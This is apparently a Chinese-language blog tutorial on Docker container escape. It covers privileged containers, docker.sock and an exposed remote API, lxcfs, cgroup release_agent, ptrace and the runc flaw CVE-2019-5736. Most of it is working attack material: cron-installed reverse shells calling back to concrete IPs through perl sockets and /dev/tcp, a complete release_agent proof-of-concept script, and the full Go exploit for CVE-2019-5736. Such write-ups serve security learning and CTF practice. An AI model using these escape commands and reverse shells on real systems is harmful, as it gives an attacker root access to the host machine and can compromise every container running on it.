---
title: "Docker容器逃逸入门"
date: "2024-02-11"
category: "技术"
layout: prose
published: true
---

# Docker容器逃逸入门

# 前言

总结下比较传统的docker逃逸方式，大的ctf一般用不到（亲身体会

一些抽象的还没复现（runc

## 判断是否容器环境

1.cgourp(看是否有docker

```jsx
cat /proc/1/cgroup | grep -qi docker && echo "Is Docker" || echo "Not Docker"

```
.dockerenv 文件
docker环境下：ls -alh /.dockerenv , 非docker环境，没有这个.dockerenv文件的

```jsx
root@4cb54de415d4:/# ls -alh /.dockerenv
-rwxr-xr-x 1 root root 0 Sep  6 07:09 /.dockerenv

```

```jsx
ls -alh /.dockerenv

```
*注：定制化比较高的docker系统也可能没有这个文件*

## 容器逃逸介绍

容器逃逸基本分3类

  1. 不安全的配置

  2. 相关程序漏洞

  3. 内核漏洞

这里主要入门介绍下1,3

## **不安全的配置**

### **[#](https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_1%E3%80%81%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F)1、特权模式**

### **检测**

在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff

```jsx
cat /proc/self/status | grep -qi "0000003fffffffff" && echo "Is privileged mode" || echo "Not privileged mode"

```

### 复现

使用 –privileged=true 创建一个容器

`docker run --rm --privileged=true -it alpine`

看capeffid

`cat /proc/self/status | grep CapEff`

### 方法一

查看挂载磁盘设备

```jsx
fdisk -l

```

  ![Untitled](img/blog_images/docker%2520%25E9%2580%2583%25E9%2580%25B8/1.png)

在容器内部执行以下命令，将宿主机文件挂载到 /test 目录下

```jsx
mkdir /test && mount /dev/vda1 /test

```
在定时任务中写入反弹 shell

这里的定时任务路径是 Ubuntu 系统路径，不同的系统定时任务路径不一样

```json
echo $'*/1 * * * * perl -e \'use Socket;$i="172.16.214.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' >> /test/var/spool/cron/crontabs/root

```
一分钟后，就能收到反弹回来的会话了，而且会话权限是宿主机 root 用户权限。

### **方法二(推荐，直接拿shell**

先将其挂载到容器中，然后使用`chroot`获取一个以宿主机根目录为根目录的`shell`来拿到宿主机的权限

```bash
mkdir /tmp/mnt
mount /dev/sda1 /tmp/mnt
cd /tmp/mnt
chroot ./ bash
reverse shell

```

## docker socket挂载

简单来说，docker容器和docker守护进程可以经过socket通信，执行宿主机的docker命令，然后就可以再创建一个容器，把宿主机的根目录挂载到

1、运行一个挂载/var/run/的容器

```jsx
docker run -it -v /var/run/:/host/var/run/ 5d2df19066ac /bin/bash

```
2、寻找下挂载的sock文件

```
find / -name docker.sock

```
3、在容器内安装client，即docker

```jsx
apt-get update
apt-get install docker.io

```
4、查看宿主机docker信息

```
docker -H unix:///host/var/run/docker.sock info

```
5、运行一个新容器并挂载宿主机根路径

```
docker -H unix:///host/var/run/docker.sock run -v /:/test -it ubuntu:14.04 /bin/bash

```
6、写入计划任务到宿主机(拿主机shell

```jsx
echo '* * * * * bash -i >& /dev/tcp/ip/4000 0>&1' >> /test/var/spool/cron/root

```

## remote api

原理和socket差不多，都是利用守护进程和宿主机通信

docker远程访问

默认情况下，Docker守护进程Unix socket（/var/run/docker.sock）来进行本地进程通信，而不会监听任何端口，因此只能在本地使用docker客户端或者使用Docker API进行操作。如果想在其他主机上操作Docker主机，就需要让Docker守护进程打开一个HTTP Socket，这样才能实现远程通信

将 docker 守护进程监听在 0.0.0.0

```jsx
dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375

```
**检测**

如果返回 404 说明存在

```jsx
IP=`hostname -i | awk -F. '{print $1 "." $2 "." $3 ".1"}' ` && wget http://$IP:2375

```
列出容器信息

```bash
curl http://<target>:2375/containers/json

```
查看容器

```bash
docker -H tcp://<target>:2375 ps -a

```
新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。

```bash
docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash

```
在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root

```bash
echo '* * * * * /bin/bash -i >& /dev/tcp/10.1.1.214/12345 0>&1' >> /mnt/var/spool/cron/crontabs/root

```
本地监听端口，获取对方宿主机shell。

## 利用lxcfs

lxcfs 是linux下一个用于虚拟化容器的工具

当pod挂载了LXCFS目录**包含CGOURP目录**，并且对CGROUP有写权限。

LXCFS通过用户态文件系统，**在容器中提供下列 procfs 的文件**：

```jsx
/proc/cpuinfo
/proc/diskstats
/proc/meminfo
/proc/stat
/proc/swaps
/proc/uptime

```
而lxcfs为容器提供了下列procfs文件,比如把宿主机的 /var/lib/lxcfs/proc/memoinfo 文件挂载到Docker容器的/proc/meminfo位置后，容器读取相应内容时会通过lxcfs获取正确的约束设定，实现容器内/proc与物理机隔离。

### 环境搭建

```jsx
apt install lxcfs
或者
git clone https://github.com/lxc/lxcfs.git

lxcfs /var/lib/lxcfs
docker run -it -v /var/lib/lxcfs/:/test/:rw kpli0rn/ubuntu:18.04 /bin/bash

```
检测：是否启用了lxcfs

```
cat /proc/1/mountinfo | grep lxcfs
cat /proc/1/* | grep lxcfs

```
利用

首先因为lxcfs/cgroup被挂载进了容器，并且容器对挂在进来的lxcfs/cgroup有读写权，那么可以先修改当前已控制容器对应的devices.allow为a来设置容器允许访问所有类型设备

```jsx
echo a > /test/lxcfs/cgroup/devices/docker/some_id/devices.allow

```
又因为/etc/host是默认挂载进容器的，我们可以通过如下命令拿到宿主机设备对应的ID号

```
cat /proc/self/mountinfo |grep etc

```
然后使用如下指令，配合刚刚拿到的宿主机对应的id号，就能读写宿主机文件了

```
mknod test b 252 1   //创建基于宿主机的块设备
debugfs -w test   //对刚刚创建的块设备进行调试，也就是能进入宿主机文件系统了

```

## 利用**notify_on_release Cgroup可编辑**

Cgroup实现内核资源（硬件）分层虚拟化

简单理解下，Cgourp分为很多子系统，一个子系统就是一个资源（cpu）的控制器

子系统要挂载到cgroup的目录分为层级

控制组群分配子系统的内存资源

任务相当于系统的一个进程，控制组群有tasks文件，通过写入任务的pid，限制任务

Cgroup有几个重要的文件

/sys/fs/cgroup 有所有子系统的信息

```jsx
/sys/fs/cgroup/<subsystem_name>/cgroup.procs 记录该子系统任务进程PID

/sys/fs/cgroup/<subsystem_name>/tasks 约等于cgroup.procs

/sys/fs/cgroup/<subsystem_name>/notify_on_release 只有0或1两个值
当为1时，cgroup下所有任务结束后，内核就会以root权限运行/sys/fs/cgroup/<subsystem_name>/release_agent 文件中对应路径的文件

```
这里组要是子系统的**notify_on_release机制**

如果子系统的**notify_on_release文件为1，**cgroup结束所有任务后内核（宿主机）会以root权限运行**release_agent文件（子系统文件夹）中**的对应路径的文件。

所以如果我们对cgroup可编辑，且获得了当前容器在宿主机中的绝对路径（知道脚本的位置），且拥有cap_sys_admin（相当于细分了的root权限：允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等）权限那么就可以完成逃逸。

主要就是利用了**release_agent文件执行恶意脚本**

### 利用

检测：

```
cat /proc/1/status | grep Cap  //看能力码

```
解密能力码

```jsx
capsh --decode=00000000a82425fb
0x00000000a82425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap

```
创建子cgroup并修改notify_on_release

```
mkdir /tmp/aa && mount -t cgroup -o rdma cgroup /tmp/aa &&echo 1 > /tmp/aa/notify_on_release

```
获取在宿主机的绝对路径

```
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab

```
然后写入子cgroup的release_agent文件，指向一个恶意的脚本文件，并给予可执行权

```
echo '#!/bin/sh' > /tmp/exp
echo "mkdir /hack_in" > /tmp/exp
d=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo $d/tmp/exp > /tmp/aa/release_agent
chmod 777 /tmp/exp

```
然后清空子cgroup目录下的cgroup.procs或tasks文件

```
sh -c "echo \$\$ > /tmp/aa/cgroup.procs"

```
检测POC

```
#!/bin/bash

set -uex

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

sleep 2
cat "/output"

```

## **SYS_PTRACE 权限逃逸**

SYS_PTRACE是启动docker容器时附加的一个权限参数，它起到一个调试器的作用。以高权限参数启动时默认带有该权限。

### 条件

有cap_sys_ptrace权限

docker起的时候docker run –pid=host，容器看的到宿主机的进程

### 利用

和上面一样看完能力为cap_sys_ptrace之后

用ps指令找到宿主机进程PID

```
ps auxx | grep root

```

  ![Untitled](img/blog_images/docker%2520%25E9%2580%2583%25E9%2580%25B8/2.png)

然后使用exp进行进程注入：[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)

需要自己编译并且修改此处的payload。改成msf或者cs的都行

  ![Untitled](img/blog_images/docker%2520%25E9%2580%2583%25E9%2580%25B8/3.png)

## **cap_sys_module 权限逃逸**

这个特权表示能够加载内核模块，那么我们只需要构造一个执行恶意命令的内核模块给容器加载就行了

具体不复现了，cap有关可以看下

[https://blog.jus4fun.xyz/article/109/](https://blog.jus4fun.xyz/article/109/)

## runc

docker version <=18.09.2 RunC version <=1.0-rc6

环境搭建,ubuntu下用metarget，官方推荐版本为Ubuntu 16.04 or **18.04**

```
metarget cnv install cve-2019-5736

```
或者脚本

```
curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh

```

### 原理

runc是Docker的容器运行时，负责Dokcer容器的容器生成和运行，举个例子 docker run -it ubuntu bash 容器的bash交互界面就是由runc启动的。runc一般在宿主机上以root权限跑着。 同时在linux中存在/proc/pid/exe 这个东西，指向某进程的源程序，如果是/proc/self/exe 就是指向当前进程的源程序。 我们可以通过劫持，将容器的bash内容更改为#!/proc/self/exe，即指向当前进程源程序，这样下次执行容器docker run -it ubuntu bash时就会执行runc本身。 runc在容器中是可以被找到的，如果我们修改了runc文件本身的内容，如修改为反弹shell，那么下次执行docker run -it ubuntu bash时就会自动反弹一个shell回来。

### 利用

exp：[https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)

注释引用自[https://ble55ing.github.io/2020/03/19/docker-20195736/](https://ble55ing.github.io/2020/03/19/docker-20195736/)

```
package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
  "fmt"
  "io/ioutil"
  "os"
  "strconv"
  "strings"
)

// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n mkdir /hack_in &\n"

func main() {
  //首先来看看能不能打开/bin/sh，即有root权限就成
  fd, err := os.Create("/bin/sh")
  if err != nil {
    fmt.Println(err)
    return
  }

    //然后将其覆盖为#!/proc/self/exe
  fmt.Fprintln(fd, "#!/proc/self/exe")
  err = fd.Close()
  if err != nil {
    fmt.Println(err)
    return
  }
  fmt.Println("[+] Overwritten /bin/sh successfully")

  // 循环遍历/proc里的文件，直到找到runc是哪个进程
  var found int
  for found == 0 {
    pids, err := ioutil.ReadDir("/proc")
    if err != nil {
      fmt.Println(err)
      return
    }
    for _, f := range pids {
      fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
      fstring := string(fbytes)
      if strings.Contains(fstring, "runc") {
        fmt.Println("[+] Found the PID:", f.Name())
        found, err = strconv.Atoi(f.Name())
        if err != nil {
          fmt.Println(err)
          return
        }
      }
    }
  }

  // 循环去读这个/proc/pid/exe，先拿到一个该文件的fd，该fd就指向了runc程序的位置
  var handleFd = -1
  for handleFd == -1 {
    // Note, you do not need to use the O_PATH flag for the exploit to work.
    handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
    if int(handle.Fd()) > 0 {
      handleFd = int(handle.Fd())
    }
  }
  fmt.Println("[+] Successfully got the file handle")

  // 然后不断的去尝试写这个指向的文件，一开始由于runc会先占用着，写不进去，直到runc的占用解除了，就立即
  for {
    writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
    if int(writeHandle.Fd()) > 0 {
      fmt.Println("[+] Successfully got write handle", writeHandle)
      writeHandle.Write([]byte(payload))
      return
    }
  }
}

```
用go打包

```
go build a.go

```
模拟黑客把二进制文件传上去，并给予可执行权

```
docker cp ./a 1f615cc4c464:/tmp
chmod 777 /tmp/a

```

# 内核漏洞

用exp造就完了

## CVE-2016-5195 : dirtyCOW
